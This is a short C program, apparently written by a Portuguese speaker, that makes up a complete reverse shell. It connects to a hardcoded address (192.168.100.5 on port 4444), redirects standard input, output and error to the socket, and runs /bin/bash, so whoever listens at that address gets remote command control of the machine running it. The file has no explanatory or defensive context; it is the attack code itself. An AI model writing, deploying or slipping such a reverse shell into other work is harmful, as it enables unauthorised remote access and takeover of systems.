#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <string.h>

int main() {
    int sock;
    struct sockaddr_in alvo;
    char *ip = "192.168.100.5";
    int port = 4444;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        printf("Erro ao criar socket\n");
        return 1;   
    }

    alvo.sin_family = AF_INET;
    alvo.sin_port = htons(port);
    alvo.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&alvo, sizeof(alvo)) < 0) {
        printf("Erro ao conectar ao alvo\n");
        return 1;
    }
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    char *shell[] = {"/bin/bash", NULL};
    execve(shell[0], shell, NULL);

    return 0;
}
